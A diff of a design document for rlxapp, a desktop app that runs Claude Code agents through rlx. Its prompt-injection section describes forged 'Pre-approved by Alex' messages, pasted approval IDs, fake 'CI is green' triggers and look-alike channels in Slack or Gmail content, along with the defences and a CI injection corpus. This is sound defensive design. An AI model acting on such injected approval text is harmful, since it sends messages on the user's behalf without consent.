+An append-only, hash-chained `audit` table (`prev_hash` per row), shown in Activity, exportable as JSONL, never leaving the machine. Rows hold seq, time, actor (owner, run, approval, `auto`), event (`draft.*`, `approval.*`, `check.*`, `send.*`, `mode.changed`), connector, destination, body hash, verdict, reasons and result (message ID or permalink).
 
 ### 8.5 Prompt injection
 
-**Rule: content read from Slack, Gmail or any connector can never create, widen or satisfy an approval.**
+**Rule: connector content can never create, widen or satisfy an approval.**
 
-- **Create.** Approvals come only from composer text (the UI tags its origin). A tool-less run parses it, and the owner's click activates it. The proposal API rejects runs that have read connector data, and models never mint approval IDs.
-- **Widen.** Approvals are immutable, and destinations are exact IDs.
-- **Satisfy.** The core binds a run to an approval when its trigger fires. "Pre-approved by Alex" or a pasted `apr_…` does nothing: the gate never reads message text, the checker never sees connector content, and recipients are checked in code.
-- **Triggers.** A watch outputs only `{met: boolean}`. A forged "CI is green" could at worst fire the approved send early, still bounded by its destination and content. This residual risk is accepted; triggers should read authoritative sources, not chat.
-- **Widgets.** `draftSend` is always a Draft.
-- **Auto.** Injected text could cause sends to destinations the connector allows. That is why Auto is opt-in, risky-labelled, rate-limited, held and logged.
-- **Tests.** CI runs an injection corpus against the gate on `FakeEngine`, including fake approval IDs and look-alike channels.
+- **Create.** Approvals come only from composer text (the UI tags its origin), parsed by a tool-less run and activated by the owner's click; the proposal API rejects runs that read connector data, and models never mint IDs.
+- **Widen.** Approvals are immutable; destinations are exact IDs.
+- **Satisfy.** The core binds a run to an approval when its trigger fires. "Pre-approved by Alex" or a pasted `apr_…` does nothing: the gate never reads message text, the checker never sees connector content, and recipients are checked in code. A widget's `draftSend` is always a Draft.
+- **Triggers (proposed default).** A connector-sourced condition fires a standing send only on verified structured metadata (sender identity, channel, status fields), which the core reads from the raw tool result at `match.path` and compares in code, never on message text. A text-based condition ("when Sam says it's green") yields a Draft, so a forged "CI is green" can't send. That rlxd exposes raw tool results is unconfirmed. Owner question 6.
+- **Auto.** Injected text could send to any destination the connector allows; hence opt-in, labelled, rate-limited, held and logged.
+- **Tests.** CI runs an injection corpus (fake approval IDs, look-alike channels, text-only triggers) against the gate on `FakeEngine`.
 
 ## 9. Modes proposal
 
-**A (recommended): one app with progressive disclosure.** Everyone sees Home (widgets), Tasks, Inbox (drafts and needs-you), Activity and Settings. A Developer toggle adds Fleet, Boards, Panes (read-only) and **Open in terminal**, which hands off to `rlx ui` (R2).
-Pros: one install, updater and codebase; reversible. Cons: developer features must stay out of the way.
+**A (recommended): one app with progressive disclosure.** Everyone sees Home (widgets), Tasks, Inbox (drafts, needs-you), Activity and Settings; a Developer toggle adds Fleet, Boards, read-only Panes and **Open in terminal** (`rlx ui`, R2). Pros: one install, updater and codebase; reversible. Cons: developer features must stay out of the way.
 
-**B (alternative): two editions from one codebase**, "rlxapp" and "rlxapp Dev", chosen at download or in onboarding.
-Pros: each edition stays focused. Cons: double the artifacts and QA; switching is harder.
+**B (alternative): two editions from one codebase**, "rlxapp" and "rlxapp Dev": more focused, but double the artifacts and QA.
 
-rlx is the engine in both (§13). The shell implements A; the owner decides after seeing it.
+The shell implements A; the owner decides after seeing it.
 
-## 10. Install and update
+## 10. Brand and themes
 
-**The app.** Tauri's updater checks signed manifests on GitHub Releases and asks before installing.
-- **macOS:** notarized `.dmg`, arm64 first.
-- **Windows:** per-user NSIS `.exe` with the WebView2 bootstrapper.
-- **Linux:** `.AppImage` and `.deb` (needs WebKitGTK 4.1).
+Owner decision, 2026-11-25: rlx's own `r\x` mark, no new logo.
+- **The mark.** rlx's [docs/assets/rlx-logo.svg](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/docs/assets/rlx-logo.svg): JetBrains Mono Medium glyphs as paths, fill #2F74F0, viewBox 1606×940, copied unchanged with its SIL OFL 1.1 attribution. Other colours are fill changes on the same paths.
+- **Where.** App icon (the mark on a #08090B tile, all icons from one 1024 px master via `tauri icon`), monochrome tray icon (template image on macOS), header, splash, about box, installer and DMG, favicon, README, sign-off link.
+- **Themes.** Default "rlx" = the TUI's `RLX_THEME` ([theme.py:80](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/ui/theme.py#L80)): primary #2F74F0, accent #14B8A6, secondary #E8FF3A, background #08090B, surface #121317, panel #1A1B20, labels on blue in #08090B. Plus a light variant, more themes and a user-picked accent, all as CSS variables that widgets get in `init` (§5.2).
+- **Tests.** Every theme passes WCAG 4.5:1 for text and 3:1 for UI parts; icon, tray and header path data equal the SVG's; "rlx" tokens equal `RLX_THEME`.
 
-**The engine.** rlx and Python are not bundled (the 25 MB budget). On first run the app runs rlx's installer and shows progress. What it needs (ask B), against today:
+## 11. Install and update
+
+**The app.** Tauri's updater checks signed manifests on GitHub Releases and asks first: notarized `.dmg` (arm64 first), per-user NSIS `.exe` with the WebView2 bootstrapper, `.AppImage`/`.deb` (WebKitGTK 4.1).
+
+**The engine.** rlx (with rlxd) and Python are not bundled (the 25 MB budget); first run runs rlx's installer behind a progress view. Needs (ask B) against today:
 
 | Need | Today |
 |---|---|
 | JSON-lines progress; no sudo prompt | Text output; `sudo` without `-n` ([install.sh:355-370](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L355-L370)) |
 | A pinned version | An unstamped copy fetches the latest release's script ([install.sh:560-568](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L560-L568)) |
 | `[serve]` by default | No extras ([install.sh:1494-1510](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L1494-L1510), [pyproject.toml:110-123](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/pyproject.toml#L110-L123)) |
-| No tmux in simple mode | An unattended install declines Homebrew, which skips tmux ([install.sh:503-515](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L503-L515), [:1631](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L1631)). Developer mode still needs tmux |
 | Native Windows (ask D) | `install.ps1` hands off to WSL2 ([install.ps1:13-21](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.ps1#L13-L21)) |
 
-rlx installs Claude Code, which also has `claude install` and `claude update` (E8).
+rlx's installer also installs Claude Code from `CLAUDE_INSTALLER_URL` ([install.sh:61](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L61)) when `wants_claude` holds ([:292-293](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L292-L293)); Claude Code also has `claude install` and `claude update` (E8).
 
-**Updates.**
-- **rlx:** `rlx --json upgrade --yes`; `--yes` is required off a terminal (R5). It refuses while an rlx UI runs ([install.py:100-101](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/install.py#L100-L101)), so the app checks `rlx --json instances` (R2) and retries when idle. Whether non-UI rlx processes also block it is unconfirmed (ask E).
-- **Claude Code:** updates itself.
+**Updates.** Claude Code updates itself. For rlx (ask E), `rlx --json upgrade --yes` (`--yes` is needed off a terminal, R5) refuses while an rlx UI, a Windows launcher or another program's `rlx` is present ([lifecycle.py:442-446](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/services/lifecycle.py#L442-L446)). Other rlx processes don't block it on macOS and Linux but run mixed old and new code until restarted ([:425-431](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/services/lifecycle.py#L425-L431)); on Windows they would likely fail the reinstall (inferred, unconfirmed). So the app checks `rlx --json upgrade --check` (`asqs`, `launchers`, `live_agents`, `remote`: [install.py:96-105](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/install.py#L96-L105)), stops its rlx processes (rlxd included), upgrades and restarts them (ask K).
 
-## 11. Platform matrix for v0
+**Branches.** Feature PRs, this doc included, target the release train `rc/0.1.0`, which reaches `main` only on the owner's go; `main` otherwise holds only what GitHub reads there (guarded CI, CODEOWNERS, templates, community files).
+
+## 12. Platform matrix for v0
 
 | | macOS | Windows | Linux |
 |---|---|---|---|
 | v0 bar | Polished; budgets enforced | Built and smoke-tested in CI | Built and smoke-tested in CI |
 | Arch | arm64 | x64 | x64 |
 | Webview | WKWebView | WebView2 | WebKitGTK 4.1 (**risk**) |
-| Tray | Menubar | System tray | AppIndicator (GNOME needs an extension) |
-| Engine | `FakeEngine`, then `RlxEngine` | `FakeEngine` until ask D | `FakeEngine`, then `RlxEngine` |
+| Tray | Menu bar (template icon) | System tray | AppIndicator (GNOME needs an extension) |
+| Engine | `FakeEngine`, then `RlxEngine` | Same; rlx's installer needs ask D | Same |
 | CI smoke | Launch, render, §5.3 tests, quit | Same | Same, under Xvfb |
 
-## 12. Local storage and privacy
+## 13. Local storage and privacy
 
 **Where data lives:** the OS app-data directory holds `rlxapp.db` (SQLite, WAL: runs, jobs, drafts, approvals, audit, widget registry, settings), `widgets/`, `transcripts/` (30 days by default) and rotated `logs/`.
 
-**Privacy.** The app stores no credentials (Claude Code and claude.ai hold them). There is no telemetry or crash reporting by default, and the app's only own traffic is the update check, which can be turned off. Claude Code's analytics setting (`analyticsDisabled`, E4) is the user's to change, not the app's. **Erase local data** deletes everything.
+**Privacy.** The app stores no credentials. No telemetry or crash reporting by default; the app's only own traffic is the update check, which can be turned off. Claude Code's `analyticsDisabled` (E4) is the user's setting. **Erase local data** deletes everything.
 
-## 13. rlx dependency
+## 14. rlx dependency
 
-**The split.** The rlx survey proposed one: in simple mode the core drives `claude -p` directly, and in developer mode it uses the rlx fleet.
+**The split, rejected.** The survey proposed simple mode driving `claude -p` directly, with the fleet for developers; on 2026-11-25 the owner ruled that all agent work, in both modes, goes through rlx.
 
-**Rejected by the owner on 2026-11-25.** All agent work, in both modes, goes through rlx. rlx 0.10.3 ("rlx for apps") is to add a tmux-free headless runner, native Windows, a scheduler, a connector surface, a non-project home, and asks A–D; ask E is answered from rlx's code. Until then the app builds against `Engine` with `FakeEngine`.
+**The engine is rlxd** (owner decision, 2026-11-25): a long-running Rust daemon in rlx's Cargo workspace, with a library crate rlxapp depends on, three-OS CI and binaries shipped with rlx. It replaces tmux as process host (portable-pty, ConPTY on Windows), runs headless Claude Code emitting stream-json, takes hooks over a local socket, runs the user scheduler and pushes events to the TUI, rlxapp and Remote. Python stays the orchestration brain and TUI. rlx 0.10.3 carries rlxd, native Windows, the connector surface, a non-project home and asks A–D; rlx's `docs/plans/0.10.3-handoff.md` drafts the app contract.
 
-**What the runner wraps** (E2, E6, E7):
-- **Structured streaming.** `-p --output-format stream-json`, plus `--include-partial-messages` for partial chunks and `--input-format stream-json` for streaming input. The probe also passed `--verbose`; whether it is still required is unconfirmed.
-- **Connectors.** claude.ai connectors load headless (§4).
-- **Hooks and trust.** User hooks run headless. `-p` skips the workspace-trust dialog, so runs must start in the app's own home directory.
+**What rlxd wraps** (E2, E7, E10; connectors in §4):
+- **Streaming.** `-p --output-format stream-json --verbose`. **`--verbose` is required**: without it, `claude` exits 1 with "When using --print, --output-format=stream-json requires --verbose" (E10). `--include-partial-messages` adds partial chunks; `--input-format stream-json` takes streaming input.
+- **Hooks and trust.** User hooks run headless; `-p` skips the trust dialog, so runs start in the app's own home directory.
 
-**Gaps,** re-checked at `c6b523c3`:
+**Gaps,** re-checked at `c6b523c3`; `FakeEngine` stands in until each closes:
+1. No native Windows ([install.ps1:13-21](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.ps1#L13-L21)).
+2. tmux-only fleet, no headless runner (R2, [install.sh:1631](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L1631)).
+3. No connector surface (R4, [app.py:249](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/app.py#L249)).
+4. No user scheduler ([watcher.py:48-108](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/watcher.py#L48-L108), R8).
+5. No app-facing push: `serve` is MCP (R6); `remote` has a password, auto-off and ngrok (R7).
+6. Installer not built for unattended GUI use (§11).
+7. Sign-in needs a TTY (§3).
+8. No versioned contract: errors drop `message` ([common.py:1261-1269](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/common.py#L1261-L1269)); `doctor --fix` prints to stdout ([root.py:160-162](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/root.py#L160-L162)).
+9. Output is screen capture ([tmux.py:10](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/tmux.py#L10)).
+10. Bound to a project folder ([workspace.py:29](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/workspace.py#L29)).
+11. Upgrade blocked while the UI runs ([install.py:100-101](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/install.py#L100-L101), §11).
 
-| # | Gap | Evidence | rlxapp until it closes |
-|---|---|---|---|
-| 1 | No native Windows | [install.ps1:13-21](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.ps1#L13-L21) | Windows runs `FakeEngine` |
-| 2 | tmux-only fleet, no headless runner | R2, [install.sh:1631](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/install.sh#L1631) | `FakeEngine` replays recorded stream-json |
-| 3 | No connector surface | R4, [app.py:249](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/app.py#L249) | Fake Slack and Gmail |
-| 4 | No user-defined scheduler | [watcher.py:48-108](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/watcher.py#L48-L108), R8 | In-app scheduler |
-| 5 | No app-facing daemon with push | R6 (`serve` is MCP), R7 (`remote`: password, auto-off, ngrok) | Fake event stream |
-| 6 | Installer not built for unattended GUI use | §10 | Fake install steps |
-| 7 | Sign-in needs a TTY | [accounts.py:1197-1210](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/accounts.py#L1197-L1210) | Fake sign-in; ask G |
-| 8 | No versioned contract | [common.py:1261-1269](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/common.py#L1261-L1269) (no `message`), [root.py:160-162](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/root.py#L160-L162) (`doctor --fix` on stdout) | `Engine` types are our proposed contract |
-| 9 | Output is screen capture | [tmux.py:10](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/tmux.py#L10) | Read-only ANSI panes |
-| 10 | Bound to a project folder | [workspace.py:29](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/workspace.py#L29) | The app's own home directory |
-| 11 | Upgrade blocked while the UI runs | [install.py:100-101](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/install.py#L100-L101) | Retry when idle |
+**Asks.** From the survey: **A** a versioned JSON envelope (`schema_version`, `ok`, `data`, `error{code,message,hint}`) with published schemas; **B** a silent installer mode (§11); **C** a localhost event stream with token auth (rlxd's push); **D** native Windows for install, accounts, upgrade and doctor; **E** upgrade-while-running and the Keychain prompt, answered (§3, §11). This doc adds:
+- **F.** rlxd forwards every tool permission request to the app, or lets it inject a PreToolUse hook. **Send safety depends on this.**
+- **G–I.** Non-TTY sign-in with JSON-lines steps (§3); connector listing with read/write annotations and no model turn (§4); session-ID and cancel pass-through (§6).
+- **J.** Runs name their connectors; rlxd holds stdin open and starts the first turn only once they are `connected`, else fails naming the rest (§4).
+- **K.** Long-lived non-UI rlx processes, rlxd included, register so `upgrade` counts them (§11).
 
-**Asks.** A–E are from the survey:
-- **A.** A versioned JSON envelope (`schema_version`, `ok`, `data`, `error{code,message,hint}`) with published schemas.
-- **B.** A silent installer mode (§10).
-- **C.** A localhost event stream with token auth.
-- **D.** Native Windows for install, accounts, upgrade and doctor.
-- **E.** Answers on upgrading while rlx runs, and on the Keychain prompt.
-
-This doc adds F–I:
-- **F.** The runner forwards every tool permission request to the app, or lets it inject a PreToolUse hook. **Send safety depends on this.**
-- **G.** A non-TTY sign-in with JSON-lines steps.
-- **H.** Connector listing with tool read/write annotations, ideally without a model turn.
-- **I.** Session IDs and cancel passed through.
-
-## 14. Open questions
+## 15. Open questions
 
 **For the owner:**
 1. Mode A or B (§9)?
-2. Slack digest default N: 15 minutes? Each refresh uses the plan.
-3. Should Auto require a destination allowlist? Is a 10 s hold right?
-4. Are `once` and `untilRevoked` enough expiry options?
-5. Does the 150 MB idle budget include rlx's background process?
-6. Who holds the Apple and Windows signing certificates?
+2. Should Auto require a destination allowlist? Is 10 s the right hold?
+3. Are `once` and `untilRevoked` enough expiry options?
+4. Does the 150 MB idle budget include rlxd?
+5. Who holds the Apple and Windows signing certificates?
+6. Condition triggers (§8.5): fire standing sends only on structured metadata, text-based ones falling back to a Draft?
+7. Gmail "today's meetings": from Gmail invites, or a Calendar connector?
 
 **For the hub:**
-1. Asks F–I (F blocks send safety, G blocks sign-in).
-2. Scheduler of record: rlx's or the app's? Can jobs run with the app closed?
-3. Ask C's transport, auth and `schema_version`.
+1. Asks F–K (F blocks send safety).
+2. Does rlxd start at login, so jobs run with the app quit? Socket or embedded crate?
+3. rlxd's event transport, auth and `schema_version` (ask C).
 4. Where is the non-developer home, and do user hooks load in app runs?
-5. Ask E's answers.
 
-## 15. Traceability
+## 16. Traceability
 
-| Vision bullet (owner's brief) | Section |
+| Brief bullet or owner decision | Section |
 |---|---|
-| Native app for macOS, Windows, Linux | §11, §10 |
-| Installs and runs rlx in the background | §10, §2, §6 |
-| Friendly for people without a terminal | §3, §9 |
-| Developers keep the rlx TUI | §9 |
-| Sleek, fast, light; Discord reference verified | §1 |
-| Long-running agent tasks via rlx and Claude Code | §6, §13 |
-| Claude Code is the only auth, for user and connectors | §3, §4 |
-| Widget dashboards: build once, extend automatically | §5 |
-| Slack digest every N minutes | §5.6 |
-| Gmail dashboard | §5.6 |
-| Clock, timer, pomodoro | §5.6 |
-| Generic per-connector widgets | §5.5 |
-| Users and their agent create widgets | §5.4 |
-| Personal agent with any name | §7 |
-| Sign-off linking to one homepage constant | §7 |
-| One app plus Developer toggle; owner decides | §9, §14 |
-| Rust core and Tauri 2; budgets; WebKitGTK risk | §1, §11 |
-| Safe sends on the user's behalf (Draft default) | §8 |
+| Native app: macOS, Windows, Linux | §11, §12 |
+| Installs and runs rlx in the background | §2, §6, §11 |
+| No terminal needed; developers keep the TUI; Developer toggle | §3, §9, §15 |
+| Sleek and light; Discord reference; Tauri 2, budgets, WebKitGTK | §1, §12 |
+| Long-running tasks; closing keeps it in the tray | §6, §14 |
+| Claude Code is the only auth | §3, §4 |
+| Widgets: build once, extend automatically | §5 |
+| Slack digest, Gmail (five sections), clock, timer, pomodoro | §5.6 |
+| Generic per-connector and agent-made widgets | §5.5, §5.4 |
+| Named agent; sign-off with one homepage constant | §7 |
+| Safe sends: three modes | §8 |
+| rlx powers both modes; rlxd | §2, §14 |
+| rlx's `r\x` mark and themes | §10 |
+| Feature PRs target `rc/0.1.0` | §11 |
 
-## 16. Evidence log
+## 17. Evidence log
 
 All commands were read-only. Nobody signed in or out, no connector tool was called, and nothing was sent.
 
 | ID | Command | Showed |
 |---|---|---|
-| E1 | `claude --version` | `2.1.332 (Claude Code)` |
+| E1, E8 | `claude --version`; `claude install --help`, `claude update --help` | `2.1.332`; native install, self-update |
 | E2 | `claude --help` | The flags cited above; `-p` skips the trust dialog; `--bare`: "OAuth and keychain are never read" |
-| E3 | `claude auth login --help`, `claude auth status --help` | `--claudeai` (default), `--console`, `--sso`; `status --json` |
+| E3 | `claude auth login --help`, `claude auth status --help` | `--claudeai` (default), `--console`, `--sso`; `--json` |
 | E4 | `claude auth status --json` (values redacted) | `loggedIn`, `authMethod: "claude.ai"`, `subscriptionType`, `analyticsDisabled` |
 | E5 | `claude mcp login --help` | "HTTP, SSE, or claude.ai connector"; `--no-browser` |
-| E6 | `claude -p "Reply with the single word OK. Do not call any tools." --output-format stream-json --verbose --tools "" --no-session-persistence --permission-mode dontAsk --permission-prompts none --setting-sources project`, empty directory | Events and init fields as reported in §4 |
+| E6 | `claude -p "Reply with the single word OK. Do not call any tools." --output-format stream-json --verbose --tools "" --no-session-persistence --permission-mode dontAsk --permission-prompts none --setting-sources project`, empty directory, stdin open | Both connectors `connected`, 67 tools, `apiKeySource: "none"` |
 | E7 | E6 without `--setting-sources project` | First event `system/hook_started` |
-| E8 | `claude install --help`, `claude update --help` | Native install, self-update |
+| E9 | E6 with `</dev/null`; then with `(sleep 6) \|` | No servers, 0 tools; then one `connected`, one `pending`, 8 tools |
+| E10 | E6 without `--verbose` | Exit 1: "When using --print, --output-format=stream-json requires --verbose" |
 | R1 | `rlx --version` | `rlx 0.10.1`; source read at `c6b523c3` |
-| R2 | `rlx --help` | `login` (AISquare), `ui`, `instances`, `serve`, `remote`, `fleet` ("each a tmux pane"), `upgrade` |
+| R2 | `rlx --help` | `login` (AISquare), `ui`, `fleet` ("each a tmux pane") |
 | R3 | `rlx --json accounts list --help` | `--usage`, `--refresh` |
 | R4 | `rlx --json connectors list` | `{"error":"not_implemented",…}`, exit 70 |
 | R5 | `rlx upgrade --help` | `--yes` "required off a terminal" |
-| R6 | `rlx serve --help` | MCP server; `--stdio`, `--port`, bearer token |
-| R7 | `rlx remote serve --help` | `--auto-off MINUTES`, ngrok |
+| R6, R7 | `rlx serve --help`; `rlx remote serve --help` | MCP server, `--stdio`, `--port`, bearer token; `--auto-off MINUTES`, ngrok |
 | R8 | `rlx watch --help` | `--detach` "in a window of the fleet's tmux server" |
